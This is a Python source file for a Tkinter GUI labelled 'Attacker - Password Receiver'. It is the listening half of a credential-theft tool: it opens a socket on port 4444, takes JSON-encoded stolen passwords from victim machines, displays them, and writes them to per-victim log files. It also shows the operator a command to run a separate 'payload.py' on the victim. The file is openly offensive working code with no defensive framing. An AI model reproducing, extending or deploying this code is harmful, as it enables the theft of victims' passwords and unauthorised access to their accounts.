import socket
import json
import tkinter as tk
from tkinter import scrolledtext, simpledialog
from tkinter import ttk
from ttkthemes import ThemedTk

# Flag to control the listener loop
running = False

def start_listener():
    global running
    running = True

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))  # Bind to all interfaces on port 4444
    server.listen(5)
    print("[*] Listening for incoming connections...")
    output_text.insert(tk.END, "[*] Listening for incoming connections...\n")
    
    while running:
        conn, addr = server.accept()
        print(f"[*] Connection received from {addr}")
        output_text.insert(tk.END, f"[*] Connection received from {addr}\n")

        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk

        conn.close()
        
        try:
            passwords = json.loads(data.decode())
            display_data(passwords)
            save_to_file(addr[0], passwords)
            output_text.insert(tk.END, f"[*] Data received and saved to logs_{addr[0]}.txt\n")
        except json.JSONDecodeError as e:
            print(f"[*] JSON Decode Error: {e}")
            output_text.insert(tk.END, f"[*] JSON Decode Error: {e}\n")

def stop_listener():
    global running
    running = False
    print("[*] Stopping the listener...")
    output_text.insert(tk.END, "[*] Stopping the listener...\n")

def display_data(data):
    output_text.delete("1.0", tk.END)
    for category, items in data.items():
        output_text.insert(tk.END, f"=== {category} ===\n")
        for item in items:
            output_text.insert(tk.END, f"{item}\n")
        output_text.insert(tk.END, "\n")

def get_victim_ip():
    victim_ip = simpledialog.askstring("Victim IP", "Enter the victim's IP address:")
    if victim_ip:
        command_output.delete("1.0", tk.END)
        command_output.insert(tk.END, f"Run this on victim: python payload.py {victim_ip} 4444\n")

def save_to_file(victim_ip, data):
    with open(f"logs_{victim_ip}.txt", "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4)
    print(f"[*] Saved extracted passwords to logs_{victim_ip}.txt")

# GUI Setup
root = ThemedTk(theme="arc")
root.title("Attacker - Password Receiver")
root.geometry("600x500")

# Create a frame for the buttons
frame = ttk.Frame(root)
frame.pack(pady=10)

# Create a title label
title_label = ttk.Label(frame, text="Attacker - Password Receiver", font=("Helvetica", 18, "bold"))
title_label.pack(pady=10)

# Create a Text widget for displaying the output
output_text = scrolledtext.ScrolledText(root, height=15, width=70, font=("Helvetica", 10), wrap=tk.WORD, padx=10, pady=10)
output_text.pack(pady=10)

# Create a Button to start the listener
start_button = ttk.Button(frame, text="Start Listener", command=start_listener)
start_button.pack(pady=5)

# Create a Button to stop the listener
stop_button = ttk.Button(frame, text="Stop Listener", command=stop_listener)
stop_button.pack(pady=5)

# Create a Button to enter the victim's IP
ip_button = ttk.Button(frame, text="Enter Victim IP", command=get_victim_ip)
ip_button.pack(pady=5)

# Create a Text widget for displaying the command output
command_output = scrolledtext.ScrolledText(root, height=2, width=70, font=("Helvetica", 10), wrap=tk.WORD, padx=10, pady=10)
command_output.pack(pady=10)
command_output.insert(tk.END, "Command to run on victim will appear here\n")

root.mainloop()
